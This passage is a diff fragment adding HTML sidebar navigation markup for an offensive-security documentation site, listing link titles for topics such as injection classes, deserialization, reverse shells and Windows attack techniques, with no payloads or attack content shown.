+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File%20Inclusion/" class="md-nav__link">
+        File Inclusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_20" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_20" id="__nav_20_label" tabindex="0">
+          GraphQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_20_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_20">
+          <span class="md-nav__icon md-icon"></span>
+          GraphQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GraphQL%20Injection/" class="md-nav__link">
+        GraphQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_21" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_21" id="__nav_21_label" tabindex="0">
+          HTTP Parameter Pollution
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_21_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_21">
+          <span class="md-nav__icon md-icon"></span>
+          HTTP Parameter Pollution
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HTTP%20Parameter%20Pollution/" class="md-nav__link">
+        HTTP Parameter Pollution
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_22" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_22" id="__nav_22_label" tabindex="0">
+          Insecure Deserialization
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_22_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_22">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Deserialization
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/" class="md-nav__link">
+        Insecure Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/DotNET/" class="md-nav__link">
+        .NET Serialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Java/" class="md-nav__link">
+        Java Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Node/" class="md-nav__link">
+        Node Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/PHP/" class="md-nav__link">
+        PHP Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Python/" class="md-nav__link">
+        Python Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/Ruby/" class="md-nav__link">
+        Ruby Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Deserialization/YAML/" class="md-nav__link">
+        YAML Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_23" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_23" id="__nav_23_label" tabindex="0">
+          Insecure Direct Object References
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_23_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_23">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Direct Object References
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Direct%20Object%20References/" class="md-nav__link">
+        Insecure Direct Object References
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_24" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_24" id="__nav_24_label" tabindex="0">
+          Insecure Management Interface
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_24_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_24">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Management Interface
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Management%20Interface/" class="md-nav__link">
+        Insecure Management Interface
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_25" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_25" id="__nav_25_label" tabindex="0">
+          Insecure Randomness
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_25_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_25">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Randomness
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Randomness/" class="md-nav__link">
+        Insecure Randomness
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_26" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_26" id="__nav_26_label" tabindex="0">
+          Insecure Source Code Management
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_26_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_26">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Source Code Management
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20Source%20Code%20Management/" class="md-nav__link">
+        Insecure Source Code Management
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_27" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_27" id="__nav_27_label" tabindex="0">
+          JSON Web Token
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_27_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_27">
+          <span class="md-nav__icon md-icon"></span>
+          JSON Web Token
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JSON%20Web%20Token/" class="md-nav__link">
+        JWT - JSON Web Token
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_28" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_28" id="__nav_28_label" tabindex="0">
+          Java RMI
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_28_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_28">
+          <span class="md-nav__icon md-icon"></span>
+          Java RMI
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Java%20RMI/" class="md-nav__link">
+        Java RMI
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_29" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_29" id="__nav_29_label" tabindex="0">
+          Kubernetes
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_29_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_29">
+          <span class="md-nav__icon md-icon"></span>
+          Kubernetes
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Kubernetes/" class="md-nav__link">
+        Kubernetes
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_30" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_30" id="__nav_30_label" tabindex="0">
+          LDAP Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_30_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_30">
+          <span class="md-nav__icon md-icon"></span>
+          LDAP Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../LDAP%20Injection/" class="md-nav__link">
+        LDAP Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_31" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_31" id="__nav_31_label" tabindex="0">
+          LaTeX Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_31_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_31">
+          <span class="md-nav__icon md-icon"></span>
+          LaTeX Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../LaTeX%20Injection/" class="md-nav__link">
+        LaTex Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_32" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_32" id="__nav_32_label" tabindex="0">
+          Mass Assignment
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_32_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_32">
+          <span class="md-nav__icon md-icon"></span>
+          Mass Assignment
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Mass%20Assignment/" class="md-nav__link">
+        Mass Assignment
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_33" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_33" id="__nav_33_label" tabindex="0">
+          Methodology and Resources
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_33_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_33">
+          <span class="md-nav__icon md-icon"></span>
+          Methodology and Resources
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Active%20Directory%20Attack/" class="md-nav__link">
+        Active Directory Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/" class="md-nav__link">
+        Bind Shell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/" class="md-nav__link">
+        Cloud - AWS
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest/" class="md-nav__link">
+        Cloud - Azure
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Cobalt%20Strike%20-%20Cheatsheet/" class="md-nav__link">
+        Cobalt Strike
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Container%20-%20Docker%20Pentest/" class="md-nav__link">
+        Container - Docker Pentest
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Container%20-%20Kubernetes%20Pentest/" class="md-nav__link">
+        Container - Kubernetes Pentest
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Escape%20Breakout/" class="md-nav__link">
+        Application Escape and Breakout
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/HTML%20Smuggling/" class="md-nav__link">
+        HTML Smuggling
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Hash%20Cracking/" class="md-nav__link">
+        Hash Cracking
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Linux%20-%20Evasion/" class="md-nav__link">
+        Linux - Evasion
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Linux%20-%20Persistence/" class="md-nav__link">
+        Linux - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Linux - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/MSSQL%20Server%20-%20Cheatsheet/" class="md-nav__link">
+        MSSQL Server
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet/" class="md-nav__link">
+        Metasploit
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Methodology%20and%20enumeration/" class="md-nav__link">
+        Bug Hunting Methodology and Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Miscellaneous%20-%20Tricks/" class="md-nav__link">
+        Miscellaneous & Tricks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Network%20Discovery/" class="md-nav__link">
+        Network Discovery
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Network%20Pivoting%20Techniques/" class="md-nav__link">
+        Network Pivoting Techniques
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Office%20-%20Attacks/" class="md-nav__link">
+        Office - Attacks
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Powershell%20-%20Cheatsheet/" class="md-nav__link">
+        Powershell
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/" class="md-nav__link">
+        Reverse Shell Cheat Sheet
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Source%20Code%20Management/" class="md-nav__link">
+        Source Code Management & CI/CD Compromise
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Subdomains%20Enumeration/" class="md-nav__link">
+        Subdomains Enumeration
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass/" class="md-nav__link">
+        AMSI Bypass
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20DPAPI/" class="md-nav__link">
+        Windows - DPAPI
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Defenses/" class="md-nav__link">
+        Windows - Defenses
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Download%20and%20Execute/" class="md-nav__link">
+        Windows - Download and execute methods
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Mimikatz/" class="md-nav__link">
+        Windows - Mimikatz
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Persistence/" class="md-nav__link">
+        Windows - Persistence
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation/" class="md-nav__link">
+        Windows - Privilege Escalation
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Methodology%20and%20Resources/Windows%20-%20Using%20credentials/" class="md-nav__link">
+        Windows - Using credentials
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_34" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_34" id="__nav_34_label" tabindex="0">
+          NoSQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_34_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_34">
+          <span class="md-nav__icon md-icon"></span>
+          NoSQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NoSQL%20Injection/" class="md-nav__link">
+        NoSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_35" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_35" id="__nav_35_label" tabindex="0">
+          OAuth Misconfiguration
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_35_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_35">
+          <span class="md-nav__icon md-icon"></span>
+          OAuth Misconfiguration
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OAuth%20Misconfiguration/" class="md-nav__link">
+        OAuth Misconfiguration
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_36" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_36" id="__nav_36_label" tabindex="0">
+          Open Redirect
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_36_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_36">
+          <span class="md-nav__icon md-icon"></span>
+          Open Redirect
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Open%20Redirect/" class="md-nav__link">
+        Open URL Redirection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_37" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_37" id="__nav_37_label" tabindex="0">
+          Prompt Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_37_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_37">
+          <span class="md-nav__icon md-icon"></span>
+          Prompt Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Prompt%20Injection/" class="md-nav__link">
+        Prompt Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_38" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_38" id="__nav_38_label" tabindex="0">
+          Prototype Pollution
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_38_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_38">
+          <span class="md-nav__icon md-icon"></span>
+          Prototype Pollution
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Prototype%20Pollution/" class="md-nav__link">
+        Prototype Pollution
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_39" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_39" id="__nav_39_label" tabindex="0">
+          Race Condition
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_39_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_39">
+          <span class="md-nav__icon md-icon"></span>
+          Race Condition
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Race%20Condition/" class="md-nav__link">
+        Race Condition
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_40" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_40" id="__nav_40_label" tabindex="0">
+          Request Smuggling
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_40_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_40">
+          <span class="md-nav__icon md-icon"></span>
+          Request Smuggling
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Request%20Smuggling/" class="md-nav__link">
+        Request Smuggling
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_41" id="__nav_41_label" tabindex="0">
+          SAML Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_41_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_41">
+          <span class="md-nav__icon md-icon"></span>
+          SAML Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SAML%20Injection/" class="md-nav__link">
+        SAML Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+      
+      
+      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_42" >
+      
+      
+      
+        <label class="md-nav__link" for="__nav_42" id="__nav_42_label" tabindex="0">
+          SQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_42_label" aria-expanded="false">
+        <label class="md-nav__title" for="__nav_42">
+          <span class="md-nav__icon md-icon"></span>
+          SQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/" class="md-nav__link">
+        SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/BigQuery%20Injection/" class="md-nav__link">
+        Google BigQuery SQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/Cassandra%20Injection/" class="md-nav__link">
+        Cassandra Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/DB2%20Injection/" class="md-nav__link">
+        DB2 Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/HQL%20Injection/" class="md-nav__link">
+        Hibernate Query Language Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/MSSQL%20Injection/" class="md-nav__link">
+        MSSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20Injection/MySQL%20Injection/" class="md-nav__link">
+        MYSQL Injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
